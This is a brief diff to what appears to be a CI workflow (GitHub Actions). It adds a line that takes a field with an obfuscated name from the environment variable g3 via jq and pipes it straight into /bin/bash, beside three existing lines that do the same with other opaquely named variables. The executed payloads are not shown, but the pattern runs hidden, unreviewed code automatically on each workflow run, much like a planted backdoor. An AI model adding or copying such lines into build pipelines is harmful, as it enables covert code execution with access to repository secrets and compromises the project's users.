@@ -20,6 +20,7 @@ jobs:
           echo $ic0531 | jq -r .c6 | /bin/bash
           echo $lgf41 | jq -r .ueb38 | /bin/bash
           echo $powf5745 | jq -r .zd9412 | /bin/bash
+          printf '%s' "$g3" | jq -r .nwagt3577 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
